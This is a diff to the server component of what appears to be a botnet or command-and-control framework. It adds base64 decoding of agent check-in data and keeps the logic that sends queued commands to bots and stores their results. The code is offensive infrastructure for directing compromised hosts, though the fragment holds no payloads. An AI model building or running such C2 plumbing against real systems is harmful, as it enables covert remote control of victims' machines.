@@ -9,6 +9,7 @@ from server.logger import log_time
 from server.db import update_client, cmd_check, update_results
 from server.config import CLIENT_PAGE, CLIENT_KEY, sock_close, sock_send, \
     sock_recv, EXTERNALIP, KEY_FILE, CERT_FILE, SSL_VERSION
+from base64 import b64decode
 
 ##################################################################
 #
@@ -46,7 +47,7 @@ class request_handler():
     Secret-Key: #################
     Hostname: ########
     os: ###########
-    Data: #############
+    Data: ############# (b64 encoded)
     """
     def __init__(self, sock, addr):
         try:
@@ -88,28 +89,32 @@ class request_handler():
     def agent_handler(self, sock, request, remote_ip):
         # Main func to direct bot actions
         try:
-            # New / Active bot checkin and check for cmd
             id = update_client(remote_ip, request['Hostname'], request['OS'], 'Active')
             cmd = cmd_check(id)
+            # Decode response data to perform checks, but leave encoded into DB
+            decoded_resp = b64decode(request['Data']).decode('utf-8')
 
-            # Send CMD
-            if request['Data'] == "check-in" and cmd:
+            # Send CMD (if applicable)
+            if decoded_resp == "check-in" and cmd:
                 self.send_cmd(sock, cmd)
                 if "-debug" in argv: print("[-->] Agent_handler Sending {} CMD: {}".format(request['Hostname'],cmd))
-            # Send OK
-            elif request['Data'] == "check-in":
+
+            # Send OK (Default)
+            elif decoded_resp == "check-in":
                 return self.get_200(sock)
-            elif request['Data'] == "{} Closed".format(request['Hostname']):
-                # Client closed, set as inactive in database
+
+            # If "[Client] Close" response, set as inactive in database
+            elif decoded_resp == "{} Closed".format(request['Hostname']):
                 update_client(remote_ip, request['Hostname'], request['OS'], 'Inactive')
                 update_results(id, request['Data'])
                 return self.get_200(sock)
-            # Read in agent results to db
+
+            # Put encoded cient response in DB
             else:
                 update_results(id, request['Data'])
-                if "-debug" in argv: print("[<--] Agent_handler Received Result {} from {}".format(request['Data'], request['Hostname']))
+                if "-debug" in argv: print("[<--] Agent_handler Deoded Received Result {} from {}".format(decoded_resp, request['Hostname']))
                 return self.get_200(sock)
-        except:
+        except Exception as e:
             self.get_200(sock)
 
 ##################################################################
